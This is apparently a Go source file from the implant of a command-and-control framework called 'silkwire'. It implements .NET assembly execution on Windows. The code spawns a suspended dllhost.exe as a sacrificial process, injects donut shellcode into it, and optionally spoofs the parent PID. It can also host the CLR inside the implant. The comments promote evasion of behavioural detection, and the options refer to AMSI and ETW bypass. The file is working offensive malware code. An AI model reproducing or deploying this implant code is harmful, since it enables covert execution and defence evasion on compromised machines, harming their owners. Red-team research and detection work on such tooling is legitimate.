//go:build windows
// +build windows

// .NET Assembly Execution
//
// This implementation supports two execution methods:
//  1. Sacrificial Process (DEFAULT): Receives donut shellcode from server and
//     executes in a disposable process (dllhost.exe). Safer and better OPSEC.
//     NOTE: Server converts assembly to shellcode via go-donut before sending.
//  2. In-Process: Direct CLR hosting using Ne0nd0g/go-clr. Faster but risky.
//
// References:
//   - https://github.com/Ne0nd0g/go-clr (in-process CLR hosting)
package main

import (
	"encoding/json"
	"fmt"

	pb "silkwire/proto"

	clr "github.com/Ne0nd0g/go-clr"
	"golang.org/x/sys/windows"
)

// ExecuteAssembly executes a .NET assembly using the specified method
// Default: Sacrificial process execution (safer, isolated)
// Optional: In-process execution via CLR hosting (faster but risky)
func (i *Implant) ExecuteAssembly(assemblyBytes []byte, args []string, options *pb.ExecuteAssemblyOptions) ([]byte, error) {
	if len(assemblyBytes) == 0 {
		return nil, fmt.Errorf("no assembly data provided")
	}

	// Determine execution method
	if options != nil && options.Method == pb.ExecuteAssemblyOptions_IN_PROCESS {
		logDebug("ExecuteAssembly: Using IN-PROCESS method (risky)")
		return i.ExecuteAssemblyInProcess(assemblyBytes, args, options)
	}

	// Default: Sacrificial process execution
	logDebug("ExecuteAssembly: Using SACRIFICIAL PROCESS method (default)")
	return i.ExecuteAssemblySacrificial(assemblyBytes, args, options)
}

// ExecuteAssemblySacrificial executes donut shellcode in a sacrificial process
// This is the DEFAULT and RECOMMENDED method - provides process isolation and better OPSEC
//
// NOTE: The server converts the .NET assembly to shellcode via go-donut BEFORE sending.
//
//	The implant only receives ready-to-inject shellcode, keeping the implant small and simple.
//
// Flow:
// 1. Receive donut shellcode from server (already converted from assembly)
// 2. Spawn sacrificial process in suspended state (default: dllhost.exe)
// 3. Inject donut shellcode into process memory
// 4. Resume execution - Donut loader bootstraps CLR and executes assembly
// 5. Assembly runs isolated from implant process
//
// Advantages over in-process:
// - Assembly crashes don't kill the implant
// - Suspicious .NET code runs in a legitimate Windows process
// - Better evasion of behavioral detection
// - Process can be terminated cleanly after execution
func (i *Implant) ExecuteAssemblySacrificial(shellcode []byte, args []string, options *pb.ExecuteAssemblyOptions) ([]byte, error) {
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("no shellcode provided")
	}

	logDebug(fmt.Sprintf("ExecuteAssemblySacrificial: Received donut shellcode, size=%d bytes", len(shellcode)))

	// Determine sacrificial process path
	// Use dllhost.exe as default - it's the optimal choice for execute-assembly:
	// - COM Surrogate Host - legitimately designed to host external code
	// - Frequently spawned by Windows (doesn't look suspicious)
	// - Compatible with Donut shellcode and CLR hosting
	// - Same as Merlin C2's default for sacrificial process execute-assembly
	processPath := "C:\\Windows\\System32\\dllhost.exe" // Default: COM Surrogate (best for .NET)
	if options != nil && options.SacrificialProcess != "" {
		processPath = options.SacrificialProcess
		logDebug(fmt.Sprintf("ExecuteAssemblySacrificial: Using custom sacrificial process: %s", processPath))
	} else {
		logDebug("ExecuteAssemblySacrificial: Using default sacrificial process: dllhost.exe")
	}

	// Spawn process and inject shellcode with proper waiting for completion
	// Use versions with output capture that wait for the process to complete
	var result []byte
	var err error

	if options != nil && options.Ppid != 0 {
		// PPID spoofing requested with output capture
		logDebug(fmt.Sprintf("ExecuteAssemblySacrificial: Spawning sacrificial process with PPID spoofing (parent PID: %d) and waiting for completion...", options.Ppid))
		result, err = i.SpawnInjectAndWait(processPath, "", shellcode, int(options.Ppid))
	} else {
		// Standard spawn and inject with waiting for completion
		logDebug(fmt.Sprintf("ExecuteAssemblySacrificial: Spawning sacrificial process, injecting, and waiting for completion..."))
		result, err = i.SpawnInjectAndWait(processPath, "", shellcode, 0)
	}

	if err != nil {
		logDebug(fmt.Sprintf("ExecuteAssemblySacrificial: Spawn and inject failed: %v", err))
		return nil, fmt.Errorf("sacrificial process execution failed: %v", err)
	}

	// Parse result from SpawnAndInject and add execute-assembly metadata
	var resultMap map[string]interface{}
	if err := json.Unmarshal(result, &resultMap); err != nil {
		// If parsing fails, return raw result
		logDebug(fmt.Sprintf("ExecuteAssemblySacrificial: Failed to parse result JSON: %v", err))
		return result, nil
	}

	// Enhance result with execute-assembly specific information
	resultMap["method"] = "sacrificial-process-donut"
	resultMap["sacrificial_process"] = processPath
	resultMap["shellcode_size"] = len(shellcode)

	if options != nil {
		if options.Runtime != "" {
			resultMap["clr_version"] = options.Runtime
		}
		resultMap["amsi_bypass"] = options.AmsiBypass
		resultMap["etw_bypass"] = options.EtwBypass
		if options.Ppid != 0 {
			resultMap["ppid_spoofed"] = options.Ppid
		}
		if options.ClassName != "" {
			resultMap["dll_class"] = options.ClassName
		}
		if options.MethodName != "" {
			resultMap["dll_method"] = options.MethodName
		}
	}

	logDebug("ExecuteAssemblySacrificial: Assembly execution completed successfully in sacrificial process")

	return json.Marshal(resultMap)
}

// ExecuteAssemblyInProcess executes a .NET assembly directly in the implant process using Ne0nd0g/go-clr
// WARNING: This is stealthier but riskier - assembly crashes/exits will kill the implant
// Uses github.com/Ne0nd0g/go-clr for proper CLR hosting with output capture
func (i *Implant) ExecuteAssemblyInProcess(assemblyBytes []byte, args []string, options *pb.ExecuteAssemblyOptions) ([]byte, error) {
	if len(assemblyBytes) == 0 {
		return nil, fmt.Errorf("no assembly data provided")
	}

	logDebug(fmt.Sprintf("ExecuteAssemblyInProcess: Starting IN-PROCESS execution via Ne0nd0g/go-clr, data size=%d bytes, args=%v", len(assemblyBytes), args))
	logDebug("ExecuteAssemblyInProcess: WARNING - If assembly calls Environment.Exit() or crashes, implant will die")

	// Execute assembly with CLR
	// Ne0nd0g/go-clr handles CLR initialization, AppDomain creation, and assembly loading automatically
	output, err := executeAssemblyWithCLR(assemblyBytes, args, options)
	if err != nil {
		logDebug(fmt.Sprintf("ExecuteAssemblyInProcess: Execution failed: %v", err))
		return nil, fmt.Errorf("in-process execution failed: %v", err)
	}

	// Build result
	result := map[string]interface{}{
		"method":        "in-process-clr-hosting",
		"output":        output,
		"output_length": len(output),
		"note":          "Assembly executed in implant process",
		"pid":           windows.GetCurrentProcessId(),
		"clr_version":   getClrVersion(options),
	}

	if options != nil && options.AppDomain != "" {
		result["appdomain"] = options.AppDomain
	}

	logDebug(fmt.Sprintf("ExecuteAssemblyInProcess: Success, captured %d bytes of output", len(output)))

	return json.Marshal(result)
}

// executeAssemblyWithCLR uses Ne0nd0g/go-clr to execute a .NET assembly in-process with output capture
// The Ne0nd0g fork handles stdout/stderr redirection internally via RedirectStdoutStderr()
// and returns output directly from InvokeAssembly()
func executeAssemblyWithCLR(assemblyBytes []byte, args []string, options *pb.ExecuteAssemblyOptions) (string, error) {
	logDebug("executeAssemblyWithCLR: Loading CLR runtime via Ne0nd0g/go-clr")

	// Step 1: Redirect STDOUT/STDERR for CLR assembly execution output capture
	logDebug("executeAssemblyWithCLR: Redirecting STDOUT/STDERR for output capture")
	err := clr.RedirectStdoutStderr()
	if err != nil {
		logDebug(fmt.Sprintf("executeAssemblyWithCLR: Failed to redirect stdout/stderr: %v", err))
		return "", fmt.Errorf("failed to redirect stdout/stderr: %v", err)
	}

	// Step 2: Load the CLR and get an ICORRuntimeHost instance
	clrVersion := getClrVersion(options)

	logDebug(fmt.Sprintf("executeAssemblyWithCLR: Loading CLR version %s", clrVersion))
	runtimeHost, err := clr.LoadCLR(clrVersion)
	if err != nil {
		logDebug(fmt.Sprintf("executeAssemblyWithCLR: Failed to load CLR: %v", err))
		return "", fmt.Errorf("failed to load CLR %s: %v", clrVersion, err)
	}
	logDebug("executeAssemblyWithCLR: CLR loaded successfully")

	// Step 3: Load assembly into default AppDomain
	logDebug("executeAssemblyWithCLR: Loading assembly into default AppDomain")
	methodInfo, err := clr.LoadAssembly(runtimeHost, assemblyBytes)
	if err != nil {
		logDebug(fmt.Sprintf("executeAssemblyWithCLR: Failed to load assembly: %v", err))
		return "", fmt.Errorf("failed to load assembly: %v", err)
	}
	logDebug("executeAssemblyWithCLR: Assembly loaded successfully")

	// Step 4: Execute assembly from default AppDomain
	// The InvokeAssembly function returns stdout and stderr directly
	logDebug(fmt.Sprintf("executeAssemblyWithCLR: Invoking assembly with args: %v", args))
	stdout, stderr := clr.InvokeAssembly(methodInfo, args)

	// Combine stdout and stderr for output
	var output string
	if stdout != "" {
		output = stdout
		logDebug(fmt.Sprintf("executeAssemblyWithCLR: Captured STDOUT (%d bytes)", len(stdout)))
	}
	if stderr != "" {
		if output != "" {
			output += "\n[STDERR]\n"
		}
		output += stderr
		logDebug(fmt.Sprintf("executeAssemblyWithCLR: Captured STDERR (%d bytes)", len(stderr)))
	}

	logDebug("executeAssemblyWithCLR: Assembly execution completed successfully")
	return output, nil
}

// getClrVersion returns the CLR version to use, defaulting to v4
func getClrVersion(options *pb.ExecuteAssemblyOptions) string {
	if options != nil && options.Runtime != "" {
		return options.Runtime
	}
	return "v4" // Default to .NET 4.x
}

// ExecuteInMemoryPowerShell executes PowerShell in memory without powershell.exe
func (i *Implant) ExecuteInMemoryPowerShell(script string) ([]byte, error) {
	// This would require hosting PowerShell via System.Management.Automation
	// For now, use regular PowerShell execution
	return i.ExecutePowerShell(script)
}
